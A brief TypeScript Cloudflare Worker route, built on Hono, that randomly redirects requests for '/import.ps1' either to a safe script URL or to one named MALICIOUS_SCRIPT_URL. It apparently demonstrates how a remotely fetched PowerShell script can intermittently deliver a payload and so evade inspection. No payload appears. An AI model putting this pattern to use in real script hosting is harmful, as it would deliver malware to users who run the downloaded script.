import { Hono } from "hono";
import { CfBindings } from "./types";

const app = new Hono<{ Bindings: CfBindings }>();

function flipACoin() {
  return Math.random() < 0.5 ? "Heads" : "Tails";
}

app.get("/import.ps1", (c) => {
  const coinflipResult = flipACoin();

  if (coinflipResult === "Heads") {
    return c.redirect(c.env.SAFE_SCRIPT_URL);
  } else {
    return c.redirect(c.env.MALICIOUS_SCRIPT_URL);
  }
});

export default app;
